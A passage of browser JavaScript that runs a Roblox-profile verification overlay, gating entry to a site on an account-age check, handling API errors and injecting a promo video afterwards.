        var actions = document.getElementById('rc-actions');
        var blocked = document.getElementById('rc-blocked');

        if (data.accountAgeOk) {
          blocked.style.display = 'none';
          actions.style.display = 'flex';
          actions.innerHTML = '<button class="rc-btn-primary" onclick="__rcEnterSite()">Enter Site</button>';
        } else {
          actions.style.display = 'flex';
          blocked.style.display = 'block';
          actions.innerHTML = '<button class="rc-btn-secondary" onclick="__rcRetryProfile()">Try Another Account</button>';
        }
      })
      .catch(function (err) {
        loader.style.display = 'none';
        btn.disabled = false;
        btn.textContent = 'Verify Profile';
        error.style.display = 'block';

        if (err.message === '429') {
          error.textContent = 'Roblox API is temporarily rate-limited. Please wait 30 seconds and try again.';
        } else {
          error.textContent = err.message || 'Failed to verify profile. Please try again.';
        }
      });
  };

  /* ── Enter site ────────────────────────────────────────── */
  window.__rcEnterSite = function () {
    var overlay = document.getElementById('rc-profile-overlay');
    if (overlay) {
      overlay.style.animation = 'rc-fadeout .3s ease forwards';
      setTimeout(function () {
        overlay.remove();
        /* Inject promo video after verification overlay is closed */
        injectPromoVideo();
      }, 310);
    }
    sessionStorage.setItem(PROFILE_KEY, 'verified');
  };

  /* ── Retry ─────────────────────────────────────────────── */
  window.__rcRetryProfile = function () {
    var display = document.getElementById('rc-profile-display');
    var form = document.getElementById('rc-verify-form');
    var input = document.getElementById('rc-username-input');
    var error = document.getElementById('rc-verify-error');
    display.style.display = 'none';
    form.style.display = 'block';
    input.value = '';
    input.focus();
    error.style.display = 'none';
  };

  /* ── Check if verified ─────────────────────────────────── */
  function isVerified() { return sessionStorage.getItem(PROFILE_KEY) === 'verified'; }

  /* ── Show verification on load ─────────────────────────── */
  if (!isVerified()) {
    showProfileVerification();
  } else {
    /* Already verified (from a previous session) — inject promo video */
    injectPromoVideo();
  }

  /* ── MutationObserver ──────────────────────────────────── */
  observer.observe(document.body, { childList: true, subtree: true });
})();
